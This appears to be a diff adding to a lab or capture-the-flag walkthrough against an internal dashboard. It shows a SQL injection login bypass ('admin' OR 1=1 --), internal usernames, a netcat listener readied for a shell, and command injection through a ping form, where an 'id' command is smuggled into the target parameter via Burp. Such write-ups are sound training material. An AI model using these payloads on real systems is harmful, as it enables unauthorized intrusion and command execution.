@@ -26,3 +26,53 @@ Results:
 /internal             (Status: 200) [Size: 8770]
 
 Only one page is returned but that is still an entry way. After going to this page I am given a login form
+After going to the login form I tried a basic SQL entry to see if the login form was weak to SQl breaches. 
+admin' OR 1=1 -- 
+was used and provided me access to the internal dashboard 
+In the internal dashboard there are many different options available to pry at such as:
+- Host Health 
+- Aduit Log 
+- Services 
+- Internal User Usernames: jmartin, svc-mon, netops 
+
+In the host health section there is a text box in where we can seach up IP addresses to probe and test their health 
+There is also a note on usage notes:
+Usage Notes
+Sends 2 ICMP echo requests with a 1-second per-packet timeout
+Accepts RFC-952 compliant hostnames and dotted-decimal IPv4 addresses
+All probe targets are recorded in the operator audit log
+ICMP traffic may be filtered by host-based firewalls on monitored nodes
+
+Our attacker IP is: 10.130.84.210. So waht happens when I plug that IP in
+
+PING 10.130.84.210 (10.130.84.210) 56(84) bytes of data.
+64 bytes from 10.130.84.210: icmp_seq=1 ttl=64 time=0.178 ms
+64 bytes from 10.130.84.210: icmp_seq=2 ttl=64 time=0.201 ms
+
+--- 10.130.84.210 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1038ms
+rtt min/avg/max/mdev = 0.178/0.189/0.201/0.011 ms
+
+Seems as if the service can reach our attacker machine 
+I start a netcat listener shell on port 4444 on the attack machine 
+nc -lvnp 4444, I am going to ping the shell through the service and see the filtering 
+
+After extensive testing of the inputs it seems as if the filter will not allow any special characters to be entered 
+This isn't an issue as I can create a proxy and edit the request to the webpage there
+After starting Burp Suite I was able to get the request 
+target=10.130.84.210%3Bid
+
+I changed it to 
+target=10.130.84.210
+id
+
+Sending that to the server I was able to get 
+ping: 10.130.84.210
+: Name or service not known
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+The results of id are right there on the page meaning Burp will be my way to go if I want to enter malicious code 
+
+
+
+
